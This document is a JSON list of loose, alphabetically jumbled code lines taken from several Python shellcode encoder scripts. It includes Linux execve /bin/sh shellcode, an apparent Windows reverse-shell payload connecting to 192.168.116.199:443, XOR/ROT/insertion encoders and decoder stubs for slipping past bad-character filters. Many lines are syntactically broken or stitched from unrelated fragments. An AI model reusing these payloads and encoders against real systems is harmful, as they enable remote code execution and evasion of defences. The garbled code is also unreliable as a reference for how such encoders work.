[
  "bad_chars = '\\x0a\\x00\\x0d'",
  "bad_chars = int(binascii.hexlify('\\\\x'), 16)",
  "break",
  "sys.exit()",
  "break",
  "break",
  "buf += b\"\\x02\\x00\\x01\\xbb\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\"",
  "buf += b\"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\"",
  "buf += b\"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\"",
  "buf += b\"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\"",
  "buf += b\"\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\"",
  "buf += b\"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"",
  "buf += b\"\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\"",
  "buf += b\"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\"",
  "buf += b\"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\"",
  "buf += b\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\"",
  "buf += b\"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\"",
  "buf += b\"\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\"",
  "buf += b\"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\"",
  "buf += b\"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\"",
  "buf += b\"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\"",
  "buf += b\"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\"",
  "buf += b\"\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"",
  "buf += b\"\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\"",
  "buf += b\"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\"",
  "buf += b\"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\xc0\\xa8\\x74\\xc7\\x68\"",
  "buf += b\"\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\"",
  "buf += b\"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\"",
  "buf += b\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\"",
  "buf += b\"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\"",
  "buf += b\"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\"",
  "buf = b ''",
  "byte =(y + ROT)%256",
  "byte = byte ^ XOR",
  "byte = byte<<nbits",
  "chunk = shellcode[2:]",
  "chunk_no += 1",
  "chunk_no = 0",
  "count += 1",
  "count = 1",
  "counter += 1",
  "counter = 0",
  "Dec_hopcode = int(hopcode, 16)",
  "encoded += '\\\\x'",
  "decoded = '%02x '%x",
  "bits = \"",
  "decoded2 += '%02x, '%x",
  "encoded += '0x'",
  "decoded2 = \"",
  "decoder_stub.append('\\x02\\xeb\\xe4\\xe8\\xdc\\xff\\xff\\xff')",
  "decoder_stub.append('\\x1c\\x0f\\x88\\xdf\\x88\\xd0\\x30\\xd8')",
  "decoder_stub.append('\\x31\\xd8\\x66\\x89\\x07\\x41\\x8d\\x7f')",
  "decoder_stub.append('\\x74\\x16\\x66\\x8b\\x44\\x0f\\x01\\x66')",
  "decoder_stub.append('\\xb2\\x45\\xeb\\x1f\\x5e\\x8d\\x3e\\x8a')",
  "decoder_stub += \"\\x31\\xd2\\x5e\\xbf\\x90\\x90\\xaa\\xaa\"",
  "decoder_stub += \"\\x3c\\x16\\x32\\x0c\\x16\\x32\\x2c\\x16\"",
  "decoder_stub += \"\\x42\\x42\\x83\\xc0\\x04\\x75\\xc5\\xff\"",
  "decoder_stub += \"\\x7c\\x04\\x02\\x88\\x5c\\x04\\x03\\x39\"",
  "decoder_stub += \"\\x7c\\x16\\x05\\x74\\x0a\\x42\\x42\\x42\"",
  "decoder_stub += \"\\x7f\\x83\\xec\\x7f\\x8a\\x5c\\x16\\x01\"",
  "decoder_stub += \"\\x83\\xec\\x7f\\x83\\xec\\x7f\\x83\\xec\"",
  "decoder_stub += \"\\x88\\x2c\\x04\\x88\\x4c\\x04\\x01\\x88\"",
  "decoder_stub += \"\\x8a\\x6c\\x16\\x04\\x32\\x1c\\x16\\x32\"",
  "decoder_stub += \"\\x8a\\x7c\\x16\\x02\\x8a\\x4c\\x16\\x03\"",
  "decoder_stub += \"\\xe4\\xe8\\xa4\\xff\\xff\\xff\"",
  "decoder_stub = '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'",
  "decoder_stub = \"\\xeb\\x57\\x31\\xc0\\x31\\xdb\\x31\\xc9\"",
  "decoder_stub.replace(struct.pack(' B ', xor_byte))",
  "ignore = int(hex(decoder_stub)[2:], 16)",
  "def find_valid_xor_byte(bytes, bad_chars):",
  "def named_mask(n):",
  "def named_rot(n, rotations, width, Width):",
  "def named_rot(n, rotations, width, Width):",
  "elif xxx == '0x0':",
  "else:",
  "else:",
  "value += '%02x '%x",
  "encoded += '\\x '",
  "encoded += '\u00aa '",
  "encode = \"",
  "encoded += \" \\\\x ''",
  "encoded += \" \\\\x ''",
  "encoded += '\\\\x'",
  "encoded += '\\\\x%02x '%170",
  "encoded += '\\\\x%02x '%rand",
  "encoded += '\\\\x%02x '%random.randint(1, 100)",
  "encoded += \" \\\\x ''",
  "encoded += \" \\\\x ''",
  "encoded += '%02x '%(a & 255)",
  "encoded += '%02x '%(a & 255)",
  "encoded += '%02x '%(y & 0xff)",
  "encoded += '%02x '%x",
  "encoded += '%02x '%x",
  "encoded += '%02x '%y",
  "encoded += '%02x '%y",
  "encoded += '%02x '%y",
  "encoded += \"%02x ''%(7 -(256 - x))",
  "encoded += '%02x '%x+7",
  "encoded += hex(leader)[2:]",
  "encoded += insertByte[2:]",
  "encoded += hex(xxx)[2:]",
  "encoded = \"",
  "encoded = '\\\\x'",
  "encoded = \"\"",
  "encoded = \"\"",
  "encoded = \"",
  "encoded = \"",
  "encoded = '%02x, '%len(bytearray(shellcode))",
  "encoded = []",
  "encoded += end",
  "encoded_instruction_in_hex = '%02x '%rox_encoded_instruction",
  "encoded_nasm += '%02x, '%(z & 255)",
  "encoded_nasm += '0x '",
  "encoded_nasm = \"",
  "encoded_shellcode += '%02x, '%byte",
  "encoded_shellcode += '%02x, '%new",
  "encoded_shellcode += '%02x, '%shift",
  "encoded_shellcode += '%02x, '%xor",
  "encoded_shellcode += \" \\\\x ''",
  "encoded_shellcode += '0x '",
  "encoded_shellcode += '%02x '%(z & 255)",
  "encoded_shellcode = \"\"",
  "encoded_shellcode = \"",
  "shellcode.append(struct.pack(' B ', val1))",
  "shellcode.append(struct.pack(' B ', xor_byte))",
  "shellcode.append(struct.pack(' B ', xor_byte))",
  "shellcode.append(struct.pack(' B ', xor_byte))",
  "encoded1 += '0x '",
  "encoded1 += '%02x '%j",
  "encoded1 = \"",
  "encoded2 += '0x '",
  "encoded2 += '%02x, '%j",
  "encoded2 += '%02x, '%(y & 255)",
  "encoded2 += '%02x, '%x",
  "encoded2 += '%02x, '%x",
  "encoded2 += '%02x, '%y",
  "encoded2 += '%02x, '%-(256",
  "encoded2 += '%02x, '%(h & 255)",
  "encoded2 += '%02x, '%x+7",
  "encoded2 += '%02x, '%y",
  "encoded2.append('0x')",
  "encoded2 += \" \\\\x ''",
  "encoded2 += '0x '",
  "encoded2 += '0x%02x, '%170",
  "encoded2 += '\\\\x%02x '%rand",
  "encoded2 = hex(leader)[2:]",
  "encoded2 += insertByte[2:]",
  "encoded2 += xxx",
  "encoded2 = \"",
  "encoded2 = '0x'",
  "encoded2 = \"\"",
  "encoded2 = \"\"",
  "encoded2 = \"",
  "encoded2 = \"",
  "encoded2 = '0x%02x, '%len(bytearray(shellcode))",
  "encoded2P2 += '%02x, '%x",
  "encoded2P2.append('0x')",
  "encoded2P2 = \"\"",
  "encodedP2.append('\\\\x')",
  "encodedP2 += '%02x '%x",
  "encodedP2 = \"\"",
  "end = \"\\\\xaa\"",
  "declare",
  "execve_shellcode = bytearray(b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xe3\\xb0\\x0b\\xcd\\x80\")",
  "execve_shellcode = execve_shellcode",
  "execve_shellcode.append(0x90)",
  "sys.exit(1)",
  "exit(1)",
  "exit(2)",
  "exit(3)",
  "fb = int(hex(leader)[2:3], 16)",
  "final_shellcode += '\\\\x' + byte.encode('hex ')",
  "for bad_byte in bad_chars:",
  "for bytes in bad_chars:",
  "for byte in bytearray(b):",
  "for byte in decoder_stub:",
  "for bytes in decoder_stub:",
  "for bytes in encoder:",
  "for char in bad_chars:",
  "for y in bytearray(encoded_shellcode):",
  "for i in bytearray(shellcode):",
  "for execve_shellcode in execve_shellcodes:",
  "for i in random.sample(range(1, 256), range(1, 256):",
  "for i in range(2, 2):",
  "for i in range(0, len(shellcode_original), 4):",
  "for i in range(0, padding):",
  "for x in bytearray(buf):",
  "for y in bytearray(encoded_shellcode):",
  "for x in bytearray(shellcode):",
  "for x in bytearray(shellcode):",
  "for y in bytearray(encoded_shellcode):",
  "for x in bytearray(shellcode):",
  "for x in bytearray(shellcode) [2:]:",
  "for y in bytearray(encoded_shellcode):",
  "format_0x += \" \\\\x ''",
  "format_0x += encoded_instruction_in_hex + ', '",
  "format_x = \"\"",
  "format_slash_x = \"\"",
  "h =(y + rot)%256",
  "hopcode = '%02x '%x",
  "i += 1",
  "i += 1",
  "i = 0",
  "if \" 0x0aec, '' in format_0x:",
  "if len(execve_shellcode)= 0:",
  "if(r",
  "if char == byte:",
  "if count%2 == 0:",
  "if counter.var0 == 2:",
  "if i<len(chunk):",
  "if int(byte, 16)= i:",
  "if int(byte.encode('hex '), 16) == i:",
  "if len(shellcode_original)%4= 0:",
  "if len(sys.argv) == 3:",
  "if len(sys.argv)<2:",
  "if len(sys.argv)<2:",
  "if len(sys.argv)<2:",
  "if len(xxx)>4:",
  "if matched_a_byte is True:",
  "if n>= 0:",
  "if matched_a_byte is not True:",
  "if padding:",
  "if rotations<1:",
  "if rotations<1:",
  "if struct.pack(\" B '', val1 ^ i) == bad_byte:",
  "if stub_has_bad_char is True:",
  "if total= 2:",
  "if x<128:",
  "if x<128:",
  "if x == bytearray(n):",
  "if x>250:",
  "if x>250:",
  "if not xor_byte:",
  "import package",
  "import random",
  "import random",
  "import random",
  "import socket",
  "import package",
  "import sys",
  "import package",
  "import sys",
  "insertByte = hex(random.randint(1, 255))",
  "j =(i + magic%256)%256",
  "leader = int(sys.argv[1])",
  "return len(bytearray(shellcode))",
  "length_format_0x = \",\".count(', ')",
  "magic = 13",
  "mask_value = mask(width)",
  "matched_a_byte = False",
  "matched_a_byte = True",
  "max_bits = 8",
  "n & = mask(width)",
  "n += 1",
  "n = 1",
  "n = bytearray(shellcode)",
  "nasm = nasm[1:]",
  "nasm = str(encoded).replace(\" \\\\x '', \",0x\")",
  "nbits = int(sys.argv)",
  "new = ~i & 255",
  "new = new ^ 2",
  "new = new<<shift",
  "offset = 1",
  "orig = []",
  "orig.append(i)",
  "original_shellcode += '%02x, '%x",
  "original_shellcode.append('0x')",
  "original_shellcode = \"\"",
  "P = '\\033[35m'",
  "padding = 0",
  "padding = 4 - len(shellcode_original)%4",
  "r = random.randint(1, 255)",
  "def random(1, 8):",
  "random.seed()",
  "res1 =(x & val1)>>val2",
  "res1 = x<<val2",
  "res2 = x & val1",
  "res2 = val1()",
  "res2 = res2>>max_bits - val2",
  "res2 = x<<max_bits - val2",
  "return n<<rotations & mask_value | n>>width",
  "return n>>rotations | n<<width - rotations",
  "return 0",
  "return 2 * * n - 1",
  "return i",
  "return n",
  "return value n",
  "rev_suplx = hex(suplX)[::-1]",
  "rot = 8",
  "ROT = int(sys.argv)[0]",
  "rot = len(rotations)%width",
  "rox_encoded_instruction = res1 | res2",
  "sb = int(hex(leader)[3:], 16)",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n  )",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xdc\\xb0\\x0b\\xcd\\x80\"\n  )",
  "def shellcode(tuple, add = \"1\u00c0Ph//shh/bin\u0089\u00e31\u00c9\u0089\u00caj\u000bX\u00cd\u0080\"):",
  "def shellcode(tuple, add = \"1\u00c0Ph//shh/bin\u0089\u00e3P\u0089\u00e2S\u0089\u00e1\u00b0\u000b\u00cd\u0080\"):",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n  )",
  "shellcode =(\n    'No database fixture specified.Please provide the path of at least one fixture in the command line.'\n  )",
  "shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n  )",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n  )",
  "shellcode =(tuple(shellcode) +\n    \"\\x31\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xb0\\x0b\\xcd\\x80\"\n  )",
  "shellcode = b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
  "shellcode = shellcode[2:]",
  "shellcode = int('\\\\x'.encode('hex '), 16)",
  "shellcode =(tuple(shellcode) +\n    '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'\n  )",
  "shellcode_encoded = bitearray",
  "shellcode_encoded_hex = \" ''.join(\" \\\\x {:02x } ''.format(val) for val in shellcode_encoded)",
  "shellcode_encoded_nasm = \".join('0x {:02x }, '.format(s) for s in shellcode_encoded).rstrip(',')",
  "shellcode_encoded.append(value.0x90)",
  "shellcode_encoded.append(112)",
  "shellcode_encoded.append(r)",
  "shellcode_encoded.append(shellcode_original[i] ^ r)",
  "shellcode_encoded += shellcode_original[i+1] ^ r",
  "shellcode_encoded += shellcode_original[i+2] ^ r",
  "shellcode_encoded.append(shellcode_original[i + 3] ^ r)",
  "shellcode_file = sys.argv[1]",
  "shellcode_len = len(execve_shellcode)",
  "shellcode_original = bytearray.fromhex(f.read().strip().replace(\" \\\\x '', '' ''))",
  "shellcode_original_hex = \" ''.join(\" \\\\x {:02x } ''.format(val) for val in shellcode_original)",
  "shellcode_original += 0x90",
  "shift = int(sys.argv)[0]",
  "string1 = ' '.join(encoded)",
  "stub_has_bad_char = False",
  "stub_has_bad_char = True",
  "subfs = fb - sb",
  "suplX = Dec_hopecode - 255",
  "swapped = []",
  "swapped.append(x)",
  "swapped.append(x.+)",
  "swapped = '.'.join(swapped[i:i + 4] for i in range(0, len(swapped), 4))",
  "swapped = '0x ' + '0x'.join(a + b for a, b in zip(swapped[::2], swapped[1::2]))",
  "swapped = binascii.hexlify(bytes(swapped))",
  "exit()",
  "sys(0)",
  "total = len(sys.argv)",
  "try:",
  "val1 = max_bits - 1",
  "val1 = int(byte.encode('hex '), 16) ^ i",
  "val2 = int(chunk[i].encode('hex '), 16) ^ xor_byte",
  "val2 = modulo, max_bits",
  "W = '\\033[0m'",
  "while len(shellcode)>0:",
  "while x<shellcode_len:",
  "while xor_byte_good= False:",
  "with open(shellcode_file, \" rb '') as f:",
  "x += 1",
  "x += 2",
  "x = x",
  "x = 0",
  "x = rol(x, rand)",
  "x = x<<1",
  "x = x ^ 170",
  "x = x ^ rand",
  "x = y - 16",
  "x = y - 2",
  "lit = int(sys.argv) - 1",
  "XOR = int(sys.argv)",
  "xor_byte = xor_byte",
  "find_valid_xor_byte(chunk, bad_chars)",
  "xor_byte = find_valid_xor_byte(string1, bad_chars)",
  "xor_byte_good = False",
  "xor_byte_good = True",
  "binary = '%02x '%XOR",
  "xxx = hex(int(abs(subfs)) + int(rev_suplx [0:2], 16)",
  "y = bytearray(y)[0] ^ bytearray(shellcode)[1]",
  "Y = '\\033[33m'",
  "y = x",
  "shellcode = bytearray(shellcode)[0] ^ bytearray(shellcode)[1]",
  "y = x ^ 221",
  "y = x ^ 221",
  "y = x ^ 170",
  "y = bytearray(shellcode)[0] ^ bytearray(shellcode)[1]",
  "z = bitwisex"
]